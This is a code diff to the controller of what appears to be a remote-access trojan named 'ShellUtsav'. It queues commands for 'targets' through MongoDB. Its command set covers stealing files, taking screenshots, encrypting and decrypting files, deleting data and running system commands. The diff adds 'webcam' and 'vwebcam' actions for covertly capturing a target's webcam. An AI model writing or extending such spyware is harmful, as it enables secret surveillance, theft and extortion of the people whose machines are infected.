@@ -12,7 +12,7 @@ import time
 from threading import Thread
 from datetime import date
 
-MY_FAV_ROOT=f'C:\\Users\\{os.getlogin()}\Desktop'
+MY_FAV_ROOT=f'{os.getcwd()}'
 MY_FAV_FOLDER='ShellUtsav'
 
 init(autoreset=True)
@@ -26,8 +26,8 @@ db=client['shell']
 
 fs=gridfs.GridFS(db)
 
-MY_COMMANDS=['targetlist','shifttarget','exit','e','quit','q','commands','dir','cd','cd..','deletefile','createfile','snap','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system']
-IGNORE_COMMANDS_ON_NETWORK=['targetlist','shifttarget','exit','e','quit','q','commands','targetinfo','refreshserver']
+MY_COMMANDS=['targetlist','shifttarget','webcam','vwebcam','exit','e','quit','q','commands','dir','cd','cd..','deletefile','createfile','snap','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system']
+IGNORE_COMMANDS_ON_NETWORK=['targetlist','webcam','vwebcam','shifttarget','exit','e','quit','q','commands','targetinfo','refreshserver']
 
 CWD=r""
 LAST_PATH=""
@@ -386,6 +386,39 @@ def ActionUploader():
             for i in MY_COMMANDS:
                 print(i)
             print()
+
+        elif a[0]=='webcam' and len(a)==1:
+                data={
+                    "action":a[0],
+                    "target":TARGET,
+                    "current_path":CWD,
+                    "is_systemCommand":0
+                    }
+                if not (col.find_one()):
+                    col.insert_one(data)
+                else:
+                    filters={
+                        "target":TARGET
+                    }
+                    col.delete_one(filters)
+                    col.insert_one(data)
+
+        elif a[0]=='vwebcam' and len(a)==2:
+            data={
+                    "action":a[0],
+                    "target":TARGET,
+                    "current_path":CWD,
+                    "timeout":a[1],
+                    "is_systemCommand":0
+                    }
+            if not (col.find_one()):
+                    col.insert_one(data)
+            else:
+                    filters={
+                        "target":TARGET
+                    }
+                    col.delete_one(filters)
+                    col.insert_one(data)
 
         elif a[0]=='showimg':
             target_element=target_strings(a,1)
